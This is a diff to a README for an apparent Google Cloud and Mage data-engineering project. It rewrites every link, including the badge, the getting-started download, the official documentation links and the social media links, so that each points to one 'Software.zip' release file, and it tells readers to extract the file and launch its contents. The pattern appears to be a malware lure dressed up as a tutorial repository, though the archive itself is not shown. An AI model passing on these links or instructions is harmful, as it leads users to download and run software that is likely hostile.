@@ -1,7 +1,7 @@
 
 # 🚀 Data Engineering with Google Cloud Platform and Mage 🧙‍♂️
 
-[![Data Engineering GCP](https://img.shields.io/badge/Data_Engineering_GCP-Data%20Pipeline%20Visualization-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Data Engineering GCP](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip%20Pipeline%20Visualization-brightgreen)](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip)
 
 Welcome to the **Data Engineering GCP** repository! This repository focuses on utilizing the power of the Google Cloud Platform (GCP) along with Mage for Data Engineering purposes. Whether you're interested in data pipelines, visualization, or working with GCP services like BigQuery and Cloud Storage, this repository has got you covered.
 
@@ -21,16 +21,16 @@ Inside this repository, you will find information and resources related to the f
 
 ## 🌟 Get Started
 
-To get started with exploring the contents of this repository, you can [download the zip file here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Make sure to extract the contents and launch the necessary files to begin your Data Engineering journey with Google Cloud Platform and Mage.
+To get started with exploring the contents of this repository, you can [download the zip file here](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip). Make sure to extract the contents and launch the necessary files to begin your Data Engineering journey with Google Cloud Platform and Mage.
 
 If the above link doesn't work, you can also check the "Releases" section of this repository for alternative download options.
 
 ## 📚 Additional Resources
 
 If you want to dive deeper into Data Engineering on GCP, here are some additional resources that you may find helpful:
-- [Google Cloud Platform Documentation](https://cloud.google.com/docs)
-- [Mage AI Pipeline Tutorials](https://mage.com/tutorials)
-- [Looker Studio User Guide](https://docs.looker.com/)
+- [Google Cloud Platform Documentation](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip)
+- [Mage AI Pipeline Tutorials](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip)
+- [Looker Studio User Guide](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip)
 
 Feel free to explore these resources to enhance your understanding of Data Engineering concepts and tools.
 
@@ -46,4 +46,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 By leveraging the capabilities of Google Cloud Platform and Mage, you can streamline your Data Engineering processes and unlock valuable insights from your data. Happy Data Engineering! 🌟
 
-🔗 Connect with us: [GitHub](https://github.com/) | [Twitter](https://twitter.com/) | [LinkedIn](https://www.linkedin.com/)
+🔗 Connect with us: [GitHub](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip) | [Twitter](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip) | [LinkedIn](https://github.com/Shakespear567/Data_Engineering_GCP/releases/download/v1.0/Software.zip)
